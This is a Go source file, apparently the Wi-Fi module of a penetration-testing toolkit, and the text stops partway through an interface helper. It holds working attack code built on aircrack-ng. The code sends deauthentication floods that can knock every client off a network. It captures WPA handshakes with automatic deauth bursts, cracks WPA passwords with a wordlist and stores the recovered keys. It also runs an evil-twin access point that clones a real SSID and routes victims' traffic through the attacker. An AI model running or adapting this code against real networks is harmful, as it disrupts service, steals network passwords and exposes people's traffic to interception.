package wifi

import (
	"bufio"
	"bytes"
	"encoding/csv"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/bryanparreira/davoid/internal/engagement"
	"github.com/bryanparreira/davoid/internal/modules/ui"
	"github.com/bryanparreira/davoid/internal/vault"
)

// Shared state populated by RunScan, consumed by Deauth/Handshake/EvilTwin.
var (
	lastScanNetworks []wifiNetwork
	lastCapturePath  string
)

type wifiNetwork struct {
	BSSID      string
	ESSID      string
	Channel    string
	Signal     string
	Encryption string
	Clients    []string
}

// =============================================================================
// 1. Monitor Mode
// =============================================================================

func RunMonitor() error {
	ui.Header("Monitor Mode — Wireless Interface Manager")

	ifaces := listAllInterfaces()
	if len(ifaces) == 0 {
		ui.Fail("No wireless interfaces found. Ensure wireless adapter is connected.")
		return nil
	}

	action := ui.Select("Action", []string{
		"Start monitor mode",
		"Stop monitor mode",
		"Check interfaces (iw dev / iwconfig)",
	})
	if action < 0 {
		return nil
	}

	if action == 2 {
		if out, err := exec.Command("iw", "dev").CombinedOutput(); err == nil {
			fmt.Println(string(out))
		} else if out2, err2 := exec.Command("iwconfig").CombinedOutput(); err2 == nil {
			fmt.Println(string(out2))
		}
		ui.PressEnter()
		return nil
	}

	idx := ui.Select("Interface", ifaces)
	if idx < 0 {
		return nil
	}
	iface := ifaces[idx]

	if action == 0 {
		method := ui.Select("Monitor mode method", []string{
			"iw  (modern — full dual-band 2.4GHz + 5GHz)",
			"airmon-ng  (classic — requires aircrack-ng suite)",
		})
		if method < 0 {
			return nil
		}

		if method == 0 {
			if _, err := exec.LookPath("iw"); err != nil {
				ui.Fail("iw not found. Install: sudo apt install iw")
				ui.PressEnter()
				return nil
			}
			phy := getPhyForIface(iface)
			if phy == "" {
				ui.Fail(fmt.Sprintf("Could not detect PHY for %s. Try airmon-ng method.", iface))
				ui.PressEnter()
				return nil
			}
			monName := iface + "mon"
			ui.Info(fmt.Sprintf("PHY: %s → creating %s (2.4GHz + 5GHz)...", phy, monName))

			exec.Command("ip", "link", "set", iface, "down").Run()
			exec.Command("iw", "dev", monName, "del").Run() // remove stale mon iface if exists

			out, err := exec.Command("iw", phy, "interface", "add", monName, "type", "monitor").CombinedOutput()
			if err != nil {
				ui.Fail(fmt.Sprintf("iw interface add failed: %v", err))
				fmt.Println(strings.TrimSpace(string(out)))
				ui.Info("Hint: run as root. sudo iw " + phy + " interface add " + monName + " type monitor")
				ui.PressEnter()
				return nil
			}

			upOut, upErr := exec.Command("ip", "link", "set", monName, "up").CombinedOutput()
			if upErr != nil {
				ui.Fail(fmt.Sprintf("ip link set %s up failed: %v — %s", monName, upErr, strings.TrimSpace(string(upOut))))
				ui.PressEnter()
				return nil
			}

			ui.Success(fmt.Sprintf("Monitor interface %s created via iw.", monName))
			ui.Success("Full dual-band: 2.4GHz channels 1-14 AND 5GHz channels 36-165.")
			ui.Info(fmt.Sprintf("Use %s in WiFi Scanner → band: Both 2.4+5GHz.", monName))
			ui.Info(fmt.Sprintf("Verify: iw dev %s info", monName))
			ui.PressEnter()
			return nil
		}

		// airmon-ng method
		if _, err := exec.LookPath("airmon-ng"); err != nil {
			ui.Fail("airmon-ng not found. Install: sudo apt install aircrack-ng  OR use iw method.")
			ui.PressEnter()
			return nil
		}
		if ui.Confirm("Kill interfering processes first? (Recommended)") {
			ui.Info("Running airmon-ng check kill...")
			killOut, _ := exec.Command("airmon-ng", "check", "kill").CombinedOutput()
			for _, line := range strings.Split(string(killOut), "\n") {
				if line = strings.TrimSpace(line); line != "" {
					fmt.Println("  " + line)
				}
			}
			fmt.Println()
		}
		ifacesBefore := listAllInterfaces()
		ui.Info(fmt.Sprintf("Starting monitor mode on %s...", iface))
		out, err := exec.Command("airmon-ng", "start", iface).CombinedOutput()
		if err != nil {
			ui.Fail(fmt.Sprintf("airmon-ng error: %v", err))
			fmt.Println(string(out))
			ui.PressEnter()
			return nil
		}
		for _, line := range strings.Split(string(out), "\n") {
			if line = strings.TrimSpace(line); strings.Contains(strings.ToLower(line), "monitor mode") {
				ui.Success(line)
			}
		}
		time.Sleep(500 * time.Millisecond)
		ifacesAfter := listAllInterfaces()
		var newIfaces []string
		for _, ni := range ifacesAfter {
			found := false
			for _, oi := range ifacesBefore {
				if ni == oi {
					found = true
					break
				}
			}
			if !found {
				newIfaces = append(newIfaces, ni)
			}
		}
		if len(newIfaces) > 0 {
			ui.Success(fmt.Sprintf("Monitor interface(s) created: %s", strings.Join(newIfaces, ", ")))
			ui.Info("Tip: for 5GHz coverage use iw method next time.")
		} else {
			ui.Info(fmt.Sprintf("Monitor mode started. Interface typically named %smon or mon0.", iface))
			ui.Info("Verify: iw dev")
		}
		ui.PressEnter()
		return nil
	}

	// Stop monitor mode
	if _, err := exec.LookPath("airmon-ng"); err == nil {
		ui.Info(fmt.Sprintf("Stopping %s via airmon-ng...", iface))
		out, err := exec.Command("airmon-ng", "stop", iface).CombinedOutput()
		if err != nil {
			ui.Fail(fmt.Sprintf("airmon-ng error: %v\n%s", err, string(out)))
			ui.PressEnter()
			return nil
		}
		for _, line := range strings.Split(string(out), "\n") {
			if line = strings.TrimSpace(line); strings.Contains(strings.ToLower(line), "monitor mode") {
				ui.Success(line)
			}
		}
	} else {
		ui.Info(fmt.Sprintf("Removing monitor interface %s via iw...", iface))
		out, err := exec.Command("iw", "dev", iface, "del").CombinedOutput()
		if err != nil {
			ui.Fail(fmt.Sprintf("iw dev del failed: %v — %s", err, strings.TrimSpace(string(out))))
			ui.PressEnter()
			return nil
		}
	}
	ui.Success(fmt.Sprintf("Monitor mode stopped on %s.", iface))
	ui.PressEnter()
	return nil
}

// =============================================================================
// 2. WiFi Network Scan (airodump-ng)
// =============================================================================

func RunScan() error {
	ui.Header("WiFi Scanner — airodump-ng Network Discovery")

	if _, err := exec.LookPath("airodump-ng"); err != nil {
		ui.Fail("airodump-ng not found. Install: sudo apt install aircrack-ng")
		return nil
	}

	ifaces := listAllInterfaces()
	if len(ifaces) == 0 {
		ui.Fail("No wireless interfaces found.")
		return nil
	}

	idx := ui.Select("Monitor interface", ifaces)
	if idx < 0 {
		return nil
	}
	monIface := ifaces[idx]

	bandIdx := ui.Select("Band to scan", []string{
		"Both 2.4GHz + 5GHz  (recommended)",
		"2.4GHz only  (channels 1-14)",
		"5GHz only  (channels 36-165)",
	})
	if bandIdx < 0 {
		return nil
	}
	bandFlag := "abg"
	switch bandIdx {
	case 1:
		bandFlag = "bg"
	case 2:
		bandFlag = "a"
	}

	durStr := ui.PromptDefault("Scan duration (seconds)", "20")
	dur, _ := strconv.Atoi(durStr)
	if dur <= 0 {
		dur = 20
	}

	bandLabel := map[string]string{"abg": "2.4GHz + 5GHz", "bg": "2.4GHz", "a": "5GHz"}[bandFlag]
	networks, stderrOut := runAirodump(monIface, bandFlag, dur)

	// If --band flag not supported by this airodump-ng version, retry without it
	if len(networks) == 0 && (strings.Contains(stderrOut, "nknown") || strings.Contains(stderrOut, "nvalid") || strings.Contains(stderrOut, "option")) {
		ui.Warn(fmt.Sprintf("--band %s not supported by this airodump-ng. Retrying 2.4GHz default scan...", bandFlag))
		bandLabel = "2.4GHz (default)"
		networks, stderrOut = runAirodump(monIface, "", dur)
	}

	if len(networks) == 0 {
		ui.Warn("No networks found.")
		if stderrOut != "" {
			ui.Info("airodump-ng output:")
			for _, line := range strings.Split(stderrOut, "\n") {
				if line = strings.TrimSpace(line); line != "" && !strings.Contains(line, "\x1b[") {
					fmt.Println("    " + line)
				}
			}
		}
		ui.Info("Check: interface is in monitor mode · correct interface selected · run as root")
		ui.PressEnter()
		return nil
	}

	lastScanNetworks = networks

	fmt.Println()
	ui.Divider()
	ui.Info(fmt.Sprintf("Found %d network(s) — band: %s", len(networks), bandLabel))
	ui.Divider()
	fmt.Printf("  %-18s  %-26s  %-4s  %-6s  %-14s  %s\n",
		"BSSID", "ESSID", "CH", "SIGNAL", "Encryption", "Clients")
	fmt.Println("  " + strings.Repeat("─", 84))

	for _, n := range networks {
		enc := n.Encryption
		if enc == "" {
			enc = "OPN"
		}
		fmt.Printf("  %-18s  %-26s  %-4s  %-6s  %-14s  %d\n",
			n.BSSID, wTrunc(n.ESSID, 24), n.Channel, n.Signal, enc, len(n.Clients))
	}

	eng, _ := engagement.Active()
	if eng != nil {
		for _, n := range networks {
			engagement.LogFinding(eng.ID, "wifi_scan", n.BSSID,
				fmt.Sprintf("WiFi AP discovered: %s", n.ESSID),
				fmt.Sprintf("BSSID: %s  Channel: %s  Encryption: %s  Signal: %s",
					n.BSSID, n.Channel, n.Encryption, n.Signal),
				"INFO", n.BSSID)
		}
		ui.Success(fmt.Sprintf("%d networks logged to engagement.", len(networks)))
	}

	fmt.Println()
	ui.PressEnter()
	return nil
}

// runAirodump runs airodump-ng and returns parsed networks + raw stderr.
// bandFlag empty = no --band argument (default 2.4GHz).
func runAirodump(monIface, bandFlag string, dur int) ([]wifiNetwork, string) {
	tmpBase := fmt.Sprintf("/tmp/davoid_scan_%d", time.Now().Unix())
	csvFile := tmpBase + "-01.csv"
	defer os.Remove(csvFile)
	defer os.Remove(tmpBase + "-01.kismet.csv")
	defer os.Remove(tmpBase + "-01.kismet.netxml")
	defer os.Remove(tmpBase + "-01.log.csv")

	args := []string{}
	if bandFlag != "" {
		args = append(args, "--band", bandFlag)
	}
	args = append(args, "--output-format", "csv", "--write", tmpBase, "--write-interval", "2", monIface)

	var stderrBuf bytes.Buffer
	cmd := exec.Command("airodump-ng", args...)
	cmd.Stdout = nil
	cmd.Stderr = &stderrBuf

	if err := cmd.Start(); err != nil {
		return nil, fmt.Sprintf("failed to start: %v", err)
	}

	spin := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
	deadline := time.Now().Add(time.Duration(dur) * time.Second)
	ticker := time.NewTicker(100 * time.Millisecond)
	i := 0
	for time.Now().Before(deadline) {
		<-ticker.C
		fmt.Printf("\r  %s  Scanning %s... (%ds remaining)",
			spin[i%len(spin)], monIface, int(time.Until(deadline).Seconds()))
		i++
	}
	ticker.Stop()
	fmt.Print("\r\033[K")

	if cmd.Process != nil {
		cmd.Process.Kill()
	}
	cmd.Wait()

	// Give OS time to flush the CSV file after process kill
	time.Sleep(200 * time.Millisecond)

	networks, err := parseAirodumpCSV(csvFile)
	if err != nil {
		return nil, stderrBuf.String()
	}

	// Sort by signal strength (higher = stronger, less negative)
	sort.Slice(networks, func(i, j int) bool {
		si, _ := strconv.Atoi(networks[i].Signal)
		sj, _ := strconv.Atoi(networks[j].Signal)
		return si > sj
	})

	return networks, stderrBuf.String()
}

// =============================================================================
// 3. Deauth Attack (aireplay-ng)
// =============================================================================

func RunDeauth() error {
	ui.Header("Deauth Attack — IEEE 802.11 Deauthentication Frames")

	if _, err := exec.LookPath("aireplay-ng"); err != nil {
		ui.Fail("aireplay-ng not found. Install: sudo apt install aircrack-ng")
		return nil
	}

	monIface := pickInterface("Monitor interface")
	if monIface == "" {
		return nil
	}

	// Injection capability test
	if ui.Confirm("Run injection test first? (Recommended — verifies driver supports packet injection)") {
		ui.Info(fmt.Sprintf("Testing injection on %s...", monIface))
		testOut, _ := exec.Command("aireplay-ng", "--test", monIface).CombinedOutput()
		for _, line := range strings.Split(string(testOut), "\n") {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			if strings.Contains(strings.ToLower(line), "injection is working") || strings.Contains(line, "30/30") {
				ui.Success(line)
			} else if strings.Contains(strings.ToLower(line), "no answer") || strings.Contains(strings.ToLower(line), "failed") {
				ui.Warn(line)
			} else {
				fmt.Println("  " + line)
			}
		}
		fmt.Println()
		if !ui.Confirm("Continue with deauth?") {
			return nil
		}
	}

	bssid, essid, channel := "", "", ""

	if len(lastScanNetworks) > 0 {
		opts := []string{"Enter manually"}
		for _, n := range lastScanNetworks {
			opts = append(opts, fmt.Sprintf("%-24s  [%s]  ch%-3s  %s",
				wTrunc(n.ESSID, 22), n.BSSID, n.Channel, n.Encryption))
		}
		idx := ui.Select("Target network", opts)
		if idx > 0 {
			n := lastScanNetworks[idx-1]
			bssid, essid, channel = n.BSSID, n.ESSID, n.Channel
		}
	}

	if bssid == "" {
		bssid = ui.Prompt("Target BSSID (e.g. AA:BB:CC:DD:EE:FF)")
		if bssid == "" {
			return nil
		}
		essid = ui.Prompt("ESSID (optional, for logging)")
		channel = ui.PromptDefault("Channel", "6")
	}

	// Set interface to target channel
	if channel != "" {
		if err := exec.Command("iw", "dev", monIface, "set", "channel", channel).Run(); err != nil {
			exec.Command("iwconfig", monIface, "channel", channel).Run()
		}
		ui.Info(fmt.Sprintf("Interface %s tuned to channel %s.", monIface, channel))
	}

	clientMAC := ui.PromptDefault("Client MAC (blank = broadcast — deauth ALL clients)", "")
	countStr := ui.PromptDefault("Packet count (0 = continuous)", "0")
	if countStr == "" {
		countStr = "0"
	}

	target := bssid
	if essid != "" {
		target = essid + " (" + bssid + ")"
	}

	fmt.Println()
	ui.Info(fmt.Sprintf("Deauthing %s via %s  ch%s", target, monIface, channel))
	ui.Warn("Press Ctrl+C to stop.")
	ui.Divider()

	args := []string{"--deauth", countStr, "-a", bssid}
	if clientMAC != "" {
		args = append(args, "-c", clientMAC)
	}
	args = append(args, monIface)

	cmd := exec.Command("aireplay-ng", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	eng, _ := engagement.Active()
	if eng != nil {
		engagement.LogFinding(eng.ID, "wifi_deauth", target,
			fmt.Sprintf("Deauthentication attack — %s", essid),
			fmt.Sprintf("BSSID: %s  Interface: %s  Client: %s", bssid, monIface, orBroadcast(clientMAC)),
			"HIGH", "")
	}

	cmd.Run()
	fmt.Println()
	ui.PressEnter()
	return nil
}

// =============================================================================
// 4. Handshake Capture (airodump-ng targeted)
// =============================================================================

func RunHandshake() error {
	ui.Header("Handshake Capture — WPA/WPA2 4-Way Handshake")

	if _, err := exec.LookPath("airodump-ng"); err != nil {
		ui.Fail("airodump-ng not found. Install: sudo apt install aircrack-ng")
		return nil
	}

	monIface := pickInterface("Monitor interface")
	if monIface == "" {
		return nil
	}

	bssid, essid, channel := "", "", ""

	if len(lastScanNetworks) > 0 {
		opts := []string{"Enter manually"}
		for _, n := range lastScanNetworks {
			opts = append(opts, fmt.Sprintf("%-24s  [%s]  ch%s", wTrunc(n.ESSID, 22), n.BSSID, n.Channel))
		}
		idx := ui.Select("Target AP", opts)
		if idx > 0 {
			n := lastScanNetworks[idx-1]
			bssid, essid, channel = n.BSSID, n.ESSID, n.Channel
		}
	}

	if bssid == "" {
		bssid = ui.Prompt("Target BSSID")
		if bssid == "" {
			return nil
		}
		essid = ui.Prompt("ESSID (for file naming)")
		channel = ui.PromptDefault("Channel", "6")
	}

	outBase := fmt.Sprintf("/tmp/davoid_hs_%s_%d", sanitize(essid), time.Now().Unix())
	lastCapturePath = outBase + "-01.cap"

	autoDeauth := ui.Confirm("Auto-deauth target to force client reconnect? (Triggers handshake faster)")

	fmt.Println()
	ui.Info(fmt.Sprintf("Capturing from %s on channel %s...", bssid, channel))
	ui.Info(fmt.Sprintf("Capture file: %s", lastCapturePath))
	if !autoDeauth {
		ui.Warn("In another terminal: run Deauth against this AP to force reconnect.")
	}
	ui.Warn("Press Ctrl+C to stop capture.")
	ui.Divider()

	cmd := exec.Command("airodump-ng",
		"-c", channel,
		"--bssid", bssid,
		"-w", outBase,
		"--output-format", "pcap",
		monIface,
	)

	// Capture both stdout and stderr — different airodump-ng builds write
	// "WPA handshake" to different streams
	var combinedBuf bytes.Buffer
	outPipe, _ := cmd.StdoutPipe()
	errPipe, _ := cmd.StderrPipe()

	if err := cmd.Start(); err != nil {
		ui.Fail(fmt.Sprintf("airodump-ng failed: %v", err))
		return nil
	}

	handshakeCh := make(chan bool, 1)
	scanStream := func(r io.Reader) {
		scanner := bufio.NewScanner(r)
		for scanner.Scan() {
			line := scanner.Text()
			combinedBuf.WriteString(line + "\n")
			if strings.Contains(line, "WPA handshake") {
				select {
				case handshakeCh <- true:
				default:
				}
				return
			}
		}
	}
	go scanStream(outPipe)
	go scanStream(errPipe)

	// Auto-deauth in background to force handshake
	var deauthCmd *exec.Cmd
	if autoDeauth {
		if _, err := exec.LookPath("aireplay-ng"); err == nil {
			time.Sleep(2 * time.Second) // let airodump settle first
			deauthArgs := []string{"--deauth", "5", "-a", bssid, monIface}
			deauthCmd = exec.Command("aireplay-ng", deauthArgs...)
			deauthCmd.Stdout = nil
			deauthCmd.Stderr = nil
			deauthCmd.Start()
			ui.Info("Auto-deauth started (5 packets)...")
		}
	}

	spin := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
	capCheckTicker := time.NewTicker(5 * time.Second)
	spinTicker := time.NewTicker(100 * time.Millisecond)
	j := 0
	captureConfirmed := false

outer:
	for {
		select {
		case got := <-handshakeCh:
			if got {
				captureConfirmed = true
			}
			break outer

		case <-capCheckTicker.C:
			// Verify cap file via aircrack-ng — reliable regardless of airodump stderr behaviour
			if _, err := os.Stat(lastCapturePath); err == nil {
				if _, err2 := exec.LookPath("aircrack-ng"); err2 == nil {
					out, _ := exec.Command("aircrack-ng", lastCapturePath).Output()
					outStr := string(out)
					if strings.Contains(outStr, "handshake") || strings.Contains(outStr, "1 potential") {
						captureConfirmed = true
						break outer
					}
				}
			}
			// Re-send deauth burst every 10s if auto-deauth is on
			if autoDeauth && deauthCmd != nil && j > 100 {
				newDeauth := exec.Command("aireplay-ng", "--deauth", "5", "-a", bssid, monIface)
				newDeauth.Stdout = nil
				newDeauth.Stderr = nil
				newDeauth.Start()
			}

		case <-spinTicker.C:
			fmt.Printf("\r  %s  Waiting for WPA handshake from %s...", spin[j%len(spin)], bssid)
			j++
		}
	}

	capCheckTicker.Stop()
	spinTicker.Stop()
	fmt.Print("\r\033[K")

	if cmd.Process != nil {
		cmd.Process.Kill()
	}
	cmd.Wait()
	if deauthCmd != nil && deauthCmd.Process != nil {
		deauthCmd.Process.Kill()
	}

	if captureConfirmed {
		ui.Success(fmt.Sprintf("WPA handshake captured! → %s", lastCapturePath))
	} else {
		ui.Info(fmt.Sprintf("Capture stopped. File: %s", lastCapturePath))
		ui.Info("Verify: aircrack-ng " + lastCapturePath)
	}

	eng, _ := engagement.Active()
	if eng != nil {
		engagement.LogFinding(eng.ID, "wifi_handshake", bssid,
			fmt.Sprintf("WPA handshake capture — %s", essid),
			fmt.Sprintf("BSSID: %s  File: %s  Confirmed: %v", bssid, lastCapturePath, captureConfirmed),
			"HIGH", "")
	}

	fmt.Println()
	ui.PressEnter()
	return nil
}

// =============================================================================
// 5. WPA Crack (aircrack-ng)
// =============================================================================

func RunCrack() error {
	ui.Header("WPA Cracker — aircrack-ng Dictionary Attack")

	if _, err := exec.LookPath("aircrack-ng"); err != nil {
		ui.Fail("aircrack-ng not found. Install: sudo apt install aircrack-ng")
		return nil
	}

	capFile := ""
	if lastCapturePath != "" {
		if _, err := os.Stat(lastCapturePath); err == nil {
			ui.Info(fmt.Sprintf("Last capture: %s", lastCapturePath))
			if !ui.Confirm("Use a different .cap file?") {
				capFile = lastCapturePath
			}
		}
	}
	if capFile == "" {
		capFile = ui.Prompt(".cap file path (e.g. /tmp/davoid_hs-01.cap)")
		if capFile == "" {
			return nil
		}
	}

	// Resolve wordlist — rockyou.txt may be gzipped on fresh Kali
	wordlist := ui.PromptDefault("Wordlist path", "/usr/share/wordlists/rockyou.txt")
	if _, err := os.Stat(wordlist); err != nil {
		gzPath := wordlist + ".gz"
		if _, err2 := os.Stat(gzPath); err2 == nil {
			ui.Warn(fmt.Sprintf("Wordlist not found at %s — found gzipped version.", wordlist))
			if ui.Confirm(fmt.Sprintf("Decompress %s now? (~140MB, takes ~30s)", gzPath)) {
				ui.Info("Decompressing rockyou.txt.gz...")
				out, err3 := exec.Command("gunzip", "-k", gzPath).CombinedOutput()
				if err3 != nil {
					ui.Fail(fmt.Sprintf("gunzip failed: %v — %s", err3, strings.TrimSpace(string(out))))
					ui.PressEnter()
					return nil
				}
				ui.Success("Decompressed: " + wordlist)
			} else {
				wordlist = ui.Prompt("Enter wordlist path")
				if wordlist == "" {
					return nil
				}
			}
		} else {
			ui.Warn(fmt.Sprintf("Wordlist not found at %s — proceeding anyway.", wordlist))
		}
	}

	bssid := ui.PromptDefault("Target BSSID (blank = try all in file)", "")

	fmt.Println()
	ui.Info(fmt.Sprintf("Cracking %s with %s...", capFile, wordlist))
	ui.Warn("Press Ctrl+C to abort.")
	ui.Divider()

	args := []string{"-w", wordlist}
	if bssid != "" {
		args = append(args, "-b", bssid)
	}
	args = append(args, capFile)

	cmd := exec.Command("aircrack-ng", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()

	fmt.Println()
	if ui.Confirm("Was a password cracked? Save to vault?") {
		pass := ui.Prompt("Cracked password")
		essid := ui.PromptDefault("Network name (ESSID)", bssid)
		eng, _ := engagement.Active()
		if eng != nil && pass != "" {
			vault.Save(eng.ID, "wifi_crack", essid, essid, pass, "wifi_psk")
			engagement.LogFinding(eng.ID, "wifi_crack", essid,
				fmt.Sprintf("WPA PSK cracked: %s", essid),
				fmt.Sprintf("BSSID: %s  PSK: %s", bssid, pass),
				"CRITICAL", pass)
			ui.Success("PSK saved to vault and engagement findings.")
		}
	}

	ui.PressEnter()
	return nil
}

// =============================================================================
// 6. Evil Twin AP (hostapd + dnsmasq)
// =============================================================================

func RunEvilTwin() error {
	ui.Header("Evil Twin — Rogue Access Point (hostapd + dnsmasq)")

	missing := []string{}
	for _, tool := range []string{"hostapd", "dnsmasq", "iptables"} {
		if _, err := exec.LookPath(tool); err != nil {
			missing = append(missing, tool)
		}
	}
	if len(missing) > 0 {
		ui.Fail(fmt.Sprintf("Missing tools: %s", strings.Join(missing, ", ")))
		ui.Info("Install: sudo apt install " + strings.Join(missing, " "))
		return nil
	}

	ifaces := listAllInterfaces()
	if len(ifaces) == 0 {
		ui.Fail("No wireless interfaces found.")
		return nil
	}

	idx := ui.Select("AP interface (managed mode — NOT the monitor interface)", ifaces)
	if idx < 0 {
		return nil
	}
	apIface := ifaces[idx]

	// Internet-connected interface for NAT (gives clients real internet access)
	outIface := ui.PromptDefault("Internet-connected interface (for NAT/routing)", "eth0")

	ssid := ""
	if len(lastScanNetworks) > 0 && ui.Confirm("Clone SSID from last scan?") {
		opts := make([]string, len(lastScanNetworks))
		for i, n := range lastScanNetworks {
			opts[i] = fmt.Sprintf("%-24s  [%s]", wTrunc(n.ESSID, 22), n.BSSID)
		}
		i2 := ui.Select("Select SSID to clone", opts)
		if i2 >= 0 {
			ssid = lastScanNetworks[i2].ESSID
		}
	}
	if ssid == "" {
		ssid = ui.Prompt("SSID for evil twin AP")
		if ssid == "" {
			return nil
		}
	}

	channel := ui.PromptDefault("Channel (1-13 for 2.4GHz, 36+ for 5GHz)", "6")
	chanNum, _ := strconv.Atoi(channel)
	apIP := ui.PromptDefault("Gateway IP for clients", "192.168.99.1")
	subnet := apIP[:strings.LastIndex(apIP, ".")+1]

	// hw_mode: g = 2.4GHz, a = 5GHz
	hwMode := "g"
	if chanNum >= 36 {
		hwMode = "a"
	}

	hostapdConf := fmt.Sprintf(`interface=%s
driver=nl80211
ssid=%s
hw_mode=%s
channel=%s
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
`, apIface, ssid, hwMode, channel)

	dnsmasqConf := fmt.Sprintf(`interface=%s
bind-interfaces
dhcp-range=%s50,%s150,12h
dhcp-option=3,%s
dhcp-option=6,%s
server=8.8.8.8
no-resolv
`, apIface, subnet, subnet, apIP, apIP)

	hostapdPath := "/tmp/davoid_hostapd.conf"
	dnsmasqPath := "/tmp/davoid_dnsmasq.conf"
	defer os.Remove(hostapdPath)
	defer os.Remove(dnsmasqPath)

	if err := os.WriteFile(hostapdPath, []byte(hostapdConf), 0600); err != nil {
		ui.Fail("Could not write hostapd.conf")
		return nil
	}
	if err := os.WriteFile(dnsmasqPath, []byte(dnsmasqConf), 0600); err != nil {
		ui.Fail("Could not write dnsmasq.conf")
		return nil
	}

	// Stop services that conflict on port 53 (systemd-resolved / system dnsmasq)
	ui.Info("Stopping conflicting DNS services...")
	exec.Command("systemctl", "stop", "systemd-resolved").Run()
	exec.Command("systemctl", "stop", "dnsmasq").Run()
	exec.Command("pkill", "-9", "dnsmasq").Run()
	time.Sleep(300 * time.Millisecond)

	// Assign AP IP to interface using ip (ifconfig deprecated)
	ui.Info(fmt.Sprintf("Configuring %s with IP %s...", apIface, apIP))
	exec.Command("ip", "link", "set", apIface, "up").Run()
	exec.Command("ip", "addr", "flush", "dev", apIface).Run()
	if out, err := exec.Command("ip", "addr", "add", apIP+"/24", "dev", apIface).CombinedOutput(); err != nil {
		ui.Fail(fmt.Sprintf("ip addr add failed: %v — %s", err, strings.TrimSpace(string(out))))
		return nil
	}

	// Enable IP forwarding
	if err := os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1"), 0644); err != nil {
		ui.Warn(fmt.Sprintf("Could not enable IP forwarding: %v", err))
	}

	// NAT — masquerade AP traffic out of internet interface
	natAdded := false
	natArgs := []string{"-t", "nat", "-A", "POSTROUTING", "-o", outIface, "-j", "MASQUERADE"}
	if out, err := exec.Command("iptables", natArgs...).CombinedOutput(); err != nil {
		ui.Warn(fmt.Sprintf("iptables NAT failed: %v — %s", err, strings.TrimSpace(string(out))))
		ui.Warn("Clients will connect but may not have internet access.")
	} else {
		natAdded = true
		ui.Success(fmt.Sprintf("NAT configured: %s → %s", apIface, outIface))
	}
	// Clean up NAT rule on exit
	if natAdded {
		defer exec.Command("iptables", "-t", "nat", "-D", "POSTROUTING", "-o", outIface, "-j", "MASQUERADE").Run()
	}

	// Allow forwarding between AP iface and internet iface
	exec.Command("iptables", "-A", "FORWARD", "-i", apIface, "-o", outIface, "-j", "ACCEPT").Run()
	exec.Command("iptables", "-A", "FORWARD", "-i", outIface, "-o", apIface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT").Run()
	defer exec.Command("iptables", "-D", "FORWARD", "-i", apIface, "-o", outIface, "-j", "ACCEPT").Run()
	defer exec.Command("iptables", "-D", "FORWARD", "-i", outIface, "-o", apIface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT").Run()

	hostapdCmd := exec.Command("hostapd", hostapdPath)
	dnsmasqCmd := exec.Command("dnsmasq", "-C", dnsmasqPath, "--no-daemon")
	hostapdCmd.Stdout = os.Stdout
	hostapdCmd.Stderr = os.Stderr
	dnsmasqCmd.Stdout = os.Stdout
	dnsmasqCmd.Stderr = os.Stderr

	if err := hostapdCmd.Start(); err != nil {
		ui.Fail(fmt.Sprintf("hostapd failed to start: %v", err))
		return nil
	}
	if err := dnsmasqCmd.Start(); err != nil {
		hostapdCmd.Process.Kill()
		ui.Fail(fmt.Sprintf("dnsmasq failed to start: %v", err))
		return nil
	}
	defer func() {
		if hostapdCmd.Process != nil {
			hostapdCmd.Process.Kill()
		}
		if dnsmasqCmd.Process != nil {
			dnsmasqCmd.Process.Kill()
		}
		// Restore IP forwarding to original state
		os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("0"), 0644)
	}()

	fmt.Println()
	ui.Success(fmt.Sprintf("Evil twin '%s' live on %s (ch %s  hw_mode=%s)", ssid, apIface, channel, hwMode))
	ui.Info(fmt.Sprintf("DHCP range: %s50 – %s150  Gateway: %s", subnet, subnet, apIP))
	if natAdded {
		ui.Success(fmt.Sprintf("NAT active — clients route via %s", outIface))
	}
	ui.Warn("Press Ctrl+C to shut down the AP.")

	eng, _ := engagement.Active()
	if eng != nil {
		engagement.LogFinding(eng.ID, "wifi_eviltwin", ssid,
			fmt.Sprintf("Evil twin AP deployed: %s", ssid),
			fmt.Sprintf("Interface: %s  Channel: %s  Gateway: %s  NAT: %v", apIface, channel, apIP, natAdded),
			"CRITICAL", "")
	}

	hostapdCmd.Wait()
	dnsmasqCmd.Process.Kill()
	dnsmasqCmd.Wait()

	fmt.Println()
	ui.Info("Evil twin stopped.")
	ui.PressEnter()
	return nil
}

// =============================================================================
// Helpers
// =============================================================================

func listAllInterfaces() []string {
	if runtime.GOOS == "linux" {
		out, err := exec.Command("iw", "dev").Output()
		if err == nil {
			var ifaces []string
			for _, line := range strings.Split(string(out), "\n") {
				if line = strings.TrimSpace(line); strings.HasPrefix(line, "Interface ") {
					ifaces = append(ifaces, strings.TrimPrefix(line, "Interface "))
				}
			}
			if len(ifaces) > 0 {
				return ifaces
			}
		}
		// fallback: scan /sys/class/net for wireless interfaces
		entries, _ := os.ReadDir("/sys/class/net")
		var ifaces []string
		for _, e := range entries {
			name := e.Name()
			if strings.HasPrefix(name, "wlan") || strings.HasPrefix(name, "mon") ||
				strings.HasPrefix(name, "wlp") || strings.HasPrefix(name, "wlx") ||
				strings.HasPrefix(name, "wl") {
				if _, err := os.Stat("/sys/class/net/" + name + "/phy80211"); err == nil {
					ifaces = append(ifaces, name)
				} else if strings.HasPrefix(name, "wlan") || strings.HasPrefix(name, "wlx") ||
					strings.HasPrefix(name, "mon") {
					ifaces = append(ifaces, name)
				}
			}
		}
		if len(ifaces) == 0 {
			if rfkillOut, err := exec.Command("rfkill", "list").Output(); err == nil {
				if strings.Contains(string(rfkillOut), "yes") {
					ui.Warn("rfkill may be blocking adapter. Run: sudo rfkill unblock all")
				}
			}
		}
		return ifaces
	}
	// macOS: find 802.11 interfaces
	ifconfigOut, err := exec.Command("ifconfig", "-a").Output()
	if err == nil {
		var ifaces []string
		currentIface := ""
		for _, line := range strings.Split(string(ifconfigOut), "\n") {
